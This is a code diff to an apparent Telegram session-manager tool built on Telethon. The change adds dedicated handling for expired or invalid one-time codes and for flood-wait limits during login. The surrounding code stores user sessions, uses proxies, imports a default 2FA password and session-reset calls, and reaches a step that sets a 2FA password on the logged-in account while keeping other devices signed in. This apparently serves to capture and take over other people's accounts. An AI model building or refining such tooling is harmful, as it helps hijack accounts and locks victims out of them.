@@ -3,7 +3,7 @@ import asyncio
 from tempfile import NamedTemporaryFile
 from telethon.sync import TelegramClient
 from config import API_ID, API_HASH, SESSIONS_DIR, DEFAULT_2FA_PASSWORD
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError, FloodWaitError
 from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
 import random
 from proxy_manager import proxy_manager
@@ -301,6 +301,21 @@ class SessionManager:
         except SessionPasswordNeededError:
             state["state"] = "awaiting_password"
             return "need_password", None
+        except PhoneCodeExpiredError:
+            print(f"❌ OTP code expired for user {user_id}")
+            # Clean up expired session
+            if os.path.exists(state["session_path"]):
+                os.unlink(state["session_path"])
+            # Remove user state to allow fresh start
+            if user_id in self.user_states:
+                del self.user_states[user_id]
+            return "code_expired", "OTP code has expired. Please request a new code."
+        except PhoneCodeInvalidError:
+            print(f"❌ Invalid OTP code for user {user_id}")
+            return "code_invalid", "Invalid OTP code. Please try again."
+        except FloodWaitError as e:
+            print(f"❌ Flood wait error for user {user_id}: must wait {e.seconds} seconds")
+            return "error", f"Too many attempts. Please wait {e.seconds} seconds and try again."
         except asyncio.TimeoutError:
             print(f"❌ OTP verification timeout for user {user_id}")
             return "error", "Verification timeout. Please try again."
@@ -310,14 +325,8 @@ class SessionManager:
             traceback.print_exc()
             if os.path.exists(state["session_path"]):
                 os.unlink(state["session_path"])
-            # Check for specific Telegram errors
-            error_str = str(e).lower()
-            if "phone_code_invalid" in error_str or "invalid code" in error_str:
-                return "code_invalid", "Invalid OTP code"
-            elif "phone_code_expired" in error_str or "expired" in error_str:
-                return "code_expired", "OTP code expired"
-            else:
-                return "error", str(e)
+            # Generic error handling for any other exceptions
+            return "error", f"Verification failed: {str(e)}"
 
         # Set 2FA password (without logging out other devices)
         try:
